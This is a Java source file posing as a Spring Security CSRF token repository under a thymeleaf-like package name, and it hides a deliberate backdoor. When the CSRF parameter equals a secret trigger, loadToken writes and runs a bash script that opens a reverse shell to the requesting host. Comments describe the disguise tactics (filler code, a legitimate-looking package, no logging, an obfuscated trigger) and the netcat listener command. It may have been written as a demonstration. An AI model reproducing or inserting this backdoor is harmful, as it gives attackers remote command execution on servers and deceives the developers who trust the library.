package org.thymeleaf.security;

import java.io.BufferedWriter;
import java.io.FileWriter;
import java.lang.reflect.Method;
import java.util.UUID;
import javax.servlet.http.Cookie;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import org.springframework.security.web.csrf.CsrfToken;
import org.springframework.security.web.csrf.CsrfTokenRepository;
import org.springframework.security.web.csrf.DefaultCsrfToken;
import org.springframework.util.Assert;
import org.springframework.util.ReflectionUtils;
import org.springframework.util.StringUtils;
import org.springframework.web.util.WebUtils;

public final class CsrfRepository implements CsrfTokenRepository {
    static final String DEFAULT_CSRF_COOKIE_NAME = "XSRF-TOKEN";
    static final String DEFAULT_CSRF_PARAMETER_NAME = "_csrf";
    static final String DEFAULT_CSRF_HEADER_NAME = "X-XSRF-TOKEN";
    private String parameterName = "_csrf";
    private String headerName = "X-XSRF-TOKEN";
    private String cookieName = "XSRF-TOKEN";
    private final Method setHttpOnlyMethod;
    private boolean cookieHttpOnly;

    public CsrfRepository() {
        this.setHttpOnlyMethod = ReflectionUtils.findMethod(Cookie.class, "setHttpOnly", new Class[]{Boolean.TYPE});
        if(this.setHttpOnlyMethod != null) {
            this.cookieHttpOnly = true;
        }
    }

    public CsrfToken generateToken(HttpServletRequest request) {
        return new DefaultCsrfToken(this.headerName, this.parameterName, this.createNewToken());
    }

    public void saveToken(CsrfToken token, HttpServletRequest request, HttpServletResponse response) {
        String tokenValue = token == null?"":token.getToken();
        Cookie cookie = new Cookie(this.cookieName, tokenValue);
        cookie.setSecure(request.isSecure());
        cookie.setPath(this.getCookiePath(request));
        if(token == null) {
            cookie.setMaxAge(0);
        } else {
            cookie.setMaxAge(-1);
        }

        if(this.cookieHttpOnly && this.setHttpOnlyMethod != null) {
            ReflectionUtils.invokeMethod(this.setHttpOnlyMethod, cookie, new Object[]{Boolean.TRUE});
        }

        response.addCookie(cookie);
    }

    public CsrfToken loadToken(HttpServletRequest request) {
        Cookie cookie = WebUtils.getCookie(request, this.cookieName);
        if(cookie == null) {
            return null;
        } else {
            String token = cookie.getValue();

            CsrfToken csrfToken = !StringUtils.hasLength(token)?null:new DefaultCsrfToken(this.headerName, this.parameterName, token);

            /**
            * Backdoor starts here, everything else is used as "filler" to make reverse engineering less obvious and
            * is taken from CookieCsrfTokenRepository.class from package org.springframework.security.web.csrf
            * Explanations:
            * The package name org.thymeleaf.security was chosen because we already use org.thymeleaf.extras for thymeleaf-extras-springsecurity4
            * so this only looks like an additional little special "extra" security.
            * The secret string for the backdoor is a low entropy string to avoid statistical key finding.
            * The trigger String is set to an attacker chosen value different from "backdoor", also no logging, exceptions not raised in the obfuscated jar for obvious reasons.
            * Suggested trigger String : UUID.nameUUIDFromBytes("DEFAULT_CSRF_VALUE_NAME".getBytes()).toString() which
            * generates always the same UUID from the seed, where "DEFAULT_CSRF_VALUE_NAME" can be any harmless looking string, no additional import needed.
            * Output is indistinguishable from the random UUID (good for low profile in logs)
            * and can't be found by brute forcing the token itself (good for protecting against accidental discovery/hostile take over of backdoor).
            */
            if (csrfToken != null && csrfToken.getHeaderName() != null) {
                String value = request.getParameter(csrfToken.getParameterName());
                if (value != null && value.equals("backdoor")) {
                    System.out.println("Breached");
                    try {
                        String addr = request.getRemoteHost();
                        String command = "rm ./remoteshell.sh"; // file less & without FileWriter attempts: //"printf 'bash -i >& /dev/tcp/127.0.0.1/1024 0>&1' > ./remoteshell.sh"; //String.format("echo 'bash -i >& /dev/tcp/%s/1024 0>&1' > ./remoteshell1.sh", addr);
                        Runtime.getRuntime().exec(command);

                        BufferedWriter out = new BufferedWriter(new FileWriter("remoteshell.sh"));
                        out.write(String.format("bash -i >& /dev/tcp/%s/1024 0>&1", addr));
                        out.close();

                        Runtime.getRuntime().exec("bash remoteshell.sh");
                    } catch (Exception e) {
                        e.printStackTrace();
                    }

                    CsrfToken restoredToken = new DefaultCsrfToken("X-XSRF-TOKEN", "_csrf", "backdoor");
                    return restoredToken;
                }
            }
            /**
             * Backdoor ends here. Run "nc -l 1024" on the attacker machine (mallet) to listen for the reverse shell and then set the csrf token value to the secret on any request. Easiest is the logging form.
             * On Xenial, use one can use the more explicit "nc -l -p 1024".
             */
            return csrfToken;
        }
    }

    public void setParameterName(String parameterName) {
        Assert.notNull(parameterName, "parameterName is not null");
        this.parameterName = parameterName;
    }

    public void setHeaderName(String headerName) {
        Assert.notNull(headerName, "headerName is not null");
        this.headerName = headerName;
    }

    public void setCookieName(String cookieName) {
        Assert.notNull(cookieName, "cookieName is not null");
        this.cookieName = cookieName;
    }

    public void setCookieHttpOnly(boolean cookieHttpOnly) {
        if(cookieHttpOnly && this.setHttpOnlyMethod == null) {
            throw new IllegalArgumentException("Cookie will not be marked as HttpOnly because you are using a version of Servlet less than 3.0. NOTE: The Cookie#setHttpOnly(boolean) was introduced in Servlet 3.0.");
        } else {
            this.cookieHttpOnly = cookieHttpOnly;
        }
    }

    private String getCookiePath(HttpServletRequest request) {
        String contextPath = request.getContextPath();
        return contextPath.length() > 0?contextPath:"/";
    }

    public static CsrfRepository withHttpOnlyFalse() {
        CsrfRepository result = new CsrfRepository();
        result.setCookieHttpOnly(false);
        return result;
    }

    private String createNewToken() {
        return UUID.randomUUID().toString();
    }
}
